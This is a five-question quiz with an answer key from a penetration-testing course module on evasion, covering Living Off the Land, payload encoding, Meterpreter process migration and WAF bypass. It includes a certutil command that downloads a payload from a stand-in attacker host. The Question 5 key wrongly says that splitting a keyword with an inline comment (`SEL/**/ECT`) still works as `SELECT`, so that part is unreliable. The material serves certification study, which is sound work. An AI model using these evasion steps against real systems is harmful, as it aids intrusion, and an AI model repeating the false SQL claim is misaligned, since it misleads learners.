# Quiz: Module 14 - Evasion Techniques and AV Bypass
## Course: CIS-4333_Penetration_Testing (CompTIA PenTest+)

---

**Question 1**
What section of a penetration testing report is written specifically for non-technical stakeholders such as executives and board members, summarizing security risks in business terms?
*   A) Technical Findings List
*   B) Executive Summary
*   C) Appendix – Scan Output
*   D) Methodology Section
*   **Correct Answer:** B) Executive Summary
*   **Distractor Analysis:**
    *   *Why B is correct:* The Executive Summary is the section of a pentest report written for a non-technical audience. It translates technical findings into business language — describing overall risk posture, most critical issues, potential business impact (financial, regulatory, reputational), and high-level remediation priorities. Executives use it to make resource allocation and risk management decisions without needing to understand the technical details of each exploit.
    *   *Why A is incorrect:* The Technical Findings List contains detailed vulnerability descriptions, exploit steps, affected systems, evidence screenshots, and specific remediation guidance — written for IT and security teams who will actually remediate the issues. It is not appropriate for a non-technical executive audience.
    *   *Why C is incorrect:* The Appendix typically contains raw tool output, full scan results, or supporting evidence. It is highly technical reference material — the opposite of an audience-appropriate executive summary.
    *   *Why D is incorrect:* The Methodology section describes the testing approach, phases followed, tools used, and scope covered. While less technical than findings, it is written for technical readers who need to understand how the assessment was conducted — not for executive business decision-making.

---

**Question 2**
In the context of penetration testing evasion, which of the following best defines **Living Off the Land (LoTL)**?
*   A) A technique that encodes a Metasploit payload multiple times with an XOR cipher to change its byte signature and evade static antivirus pattern matching.
*   B) An evasion strategy that uses legitimate system tools and binaries already present on the target — such as `certutil.exe`, `powershell.exe`, or `mshta.exe` — to perform malicious actions without dropping custom malware.
*   C) A post-exploitation technique that injects shellcode into the memory space of a legitimate running process to execute under that process's identity and evade process-based detection.
*   D) A network evasion technique that fragments packets into small pieces so that signature-based IDS sensors cannot reassemble and match the attack pattern.
*   **Correct Answer:** B) An evasion strategy that uses legitimate system tools and binaries already present on the target — such as `certutil.exe`, `powershell.exe`, or `mshta.exe` — to perform malicious actions without dropping custom malware.
*   **Distractor Analysis:**
    *   *Why B is correct:* Living Off the Land (LoTL) avoids the most reliable detection trigger — introducing a new, unknown executable — by repurposing trusted Windows binaries (LOLBins) that are signed by Microsoft and permitted by application whitelisting policies. For example, `certutil.exe -urlcache -split -f http://attacker/payload.exe` downloads a file using a built-in certificate utility. Since these tools are legitimate, their use often bypasses both AV and application control policies.
    *   *Why A is incorrect:* This describes payload encoding — specifically the `shikata_ga_nai` XOR encoder in msfvenom. Encoding changes the payload's byte pattern to evade static signatures, but it does not use existing system tools and is a distinct evasion category from LoTL.
    *   *Why C is incorrect:* This describes process injection — executing code inside a legitimate process's memory space. While process injection also achieves evasion, it requires dropping or running custom code; LoTL specifically uses pre-existing legitimate binaries to avoid that step.
    *   *Why D is incorrect:* This describes network-level packet fragmentation — an IDS evasion technique operating at the network layer. LoTL is an endpoint evasion technique focused on avoiding file-based and process-based detection controls, not network sensors.

---

**Question 3**
A penetration tester generates a Meterpreter payload using `msfvenom` with the `shikata_ga_nai` encoder and uploads it to a target. The endpoint detection and response (EDR) system still detects and blocks the payload. What is the most likely reason the encoding failed to evade detection?
*   A) The `shikata_ga_nai` encoder is only compatible with Linux ELF payloads and does not function on Windows executable formats.
*   B) The encoded payload was too large to fit in memory and triggered a buffer overflow detection alert in the EDR.
*   C) Modern EDR systems primarily use behavioral detection — observing code execution, API calls, and memory patterns at runtime — rather than static signature matching, so encoding the payload's byte pattern does not reliably bypass them.
*   D) The msfvenom command requires the `-e x64/xor` encoder for 64-bit Windows targets; `shikata_ga_nai` only works against 32-bit systems and produced an incompatible payload.
*   **Correct Answer:** C) Modern EDR systems primarily use behavioral detection — observing code execution, API calls, and memory patterns at runtime — rather than static signature matching, so encoding the payload's byte pattern does not reliably bypass them.
*   **Distractor Analysis:**
    *   *Why C is correct:* PT0-002 specifically tests that modern EDR/AV products have moved beyond static signature matching. Behavioral engines execute suspicious code in a sandbox or monitor it at runtime — watching for actions like process injection, suspicious API call sequences (e.g., `VirtualAlloc` + `WriteProcessMemory` + `CreateRemoteThread`), and unusual network connections. Encoding changes what the payload looks like on disk but does not hide what it does when it runs. The `shikata_ga_nai` signature is also widely known and may be detected statically as well.
    *   *Why A is incorrect:* `shikata_ga_nai` is an x86 encoder primarily used with Windows payloads — it is not limited to Linux ELF files. It is one of the most commonly used encoders for Windows executable payloads in msfvenom.
    *   *Why B is incorrect:* Payload encoding does not significantly increase payload size in a way that would trigger memory overflow alerts. EDR detection of encoded payloads is based on behavioral and signature analysis, not memory sizing.
    *   *Why D is incorrect:* While `shikata_ga_nai` is an x86 encoder (not x64), a 32-bit payload running on a 64-bit Windows system would typically fail to execute or produce an architectural mismatch error — not an EDR detection alert. The question states the payload was detected and blocked, which points to behavioral detection rather than an encoding compatibility issue.

---

**Question 4**
A penetration tester has an active Meterpreter session running as a standard user on a Windows target. The AV product is flagging the `meterpreter.exe` process. Which evasion technique would best hide the Meterpreter session from process-based detection?
*   A) Run `getsystem` to escalate to SYSTEM — higher privilege processes are less likely to be monitored by AV.
*   B) Use the `migrate` command to inject the Meterpreter payload into a legitimate running process such as `explorer.exe` or `svchost.exe`.
*   C) Run `hashdump` to extract credentials and use them to open a new RDP session, abandoning the Meterpreter session.
*   D) Upload an encoded version of the Meterpreter DLL to the target and re-execute it — the new encoding will prevent AV from identifying the process.
*   **Correct Answer:** B) Use the `migrate` command to inject the Meterpreter payload into a legitimate running process such as `explorer.exe` or `svchost.exe`.
*   **Distractor Analysis:**
    *   *Why B is correct:* Meterpreter's `migrate` command performs process injection — it moves the payload's execution context into the memory space of an already-running legitimate process. Once migrated, the Meterpreter session runs under `explorer.exe` or `svchost.exe` instead of an obviously suspicious process name. Process-based AV detection looking for the original process name will no longer find it. This is the standard Meterpreter evasion technique for post-exploitation session stability and stealth.
    *   *Why A is incorrect:* `getsystem` escalates privileges to SYSTEM — it does not change the process identity or hide the Meterpreter session from process-based detection. A SYSTEM-level Meterpreter process is still detectable by process name.
    *   *Why C is incorrect:* Opening an RDP session abandons the Meterpreter session entirely rather than evading AV detection. This is a lateral movement technique, not an evasion technique for the current session.
    *   *Why D is incorrect:* Re-uploading and re-executing an encoded payload would create a new process and generate additional detection events — the opposite of evasion. AV detection of a running process is based on behavioral monitoring and memory scanning, not the original file's encoding.

---

**Question 5**
A web application firewall (WAF) is blocking SQL injection attempts against a login form. A penetration tester observes that the WAF blocks requests containing the string `SELECT`. Which WAF evasion technique is most likely to bypass this signature-based rule?
*   A) Switching from a GET request to a POST request to prevent the WAF from inspecting the SQL payload in the URL query string.
*   B) Using comment injection to break up the keyword: `SEL/**/ECT` — inserting a SQL comment within the keyword so it passes WAF pattern matching but is still interpreted as valid SQL by the database.
*   C) Base64-encoding the entire SQL query and sending it as the parameter value — the WAF cannot decode base64 before inspection.
*   D) Sending the SQL injection payload over HTTPS instead of HTTP so the WAF cannot inspect the encrypted request body.
*   **Correct Answer:** B) Using comment injection to break up the keyword: `SEL/**/ECT` — inserting a SQL comment within the keyword so it passes WAF pattern matching but is still interpreted as valid SQL by the database.
*   **Distractor Analysis:**
    *   *Why B is correct:* SQL comment injection (`/**/`) is a classic WAF evasion technique. SQL databases ignore `/* ... */` comment blocks within keywords, so `SEL/**/ECT` is functionally identical to `SELECT` when parsed by the database. However, a simple WAF signature looking for the literal string `SELECT` will not match `SEL/**/ECT`. Other similar techniques include case variation (`SeLeCt`), URL encoding (`%53%45%4C%45%43%54`), and double encoding. PT0-002 tests basic WAF evasion awareness.
    *   *Why A is incorrect:* Modern WAFs inspect both GET and POST request bodies and do not limit inspection to URL query strings. Changing the HTTP method does not prevent the WAF from analyzing the request body where the SQL payload would be submitted.
    *   *Why C is incorrect:* Web applications do not automatically base64-decode parameter values before passing them to the database — a base64-encoded SQL query would be treated as a literal string by the SQL interpreter, not as SQL syntax. This would break the injection rather than evade the WAF.
    *   *Why D is incorrect:* WAFs deployed as reverse proxies or in-line appliances terminate the TLS/HTTPS connection and inspect the decrypted payload before forwarding it to the application server. HTTPS does not prevent a properly deployed WAF from inspecting request content.
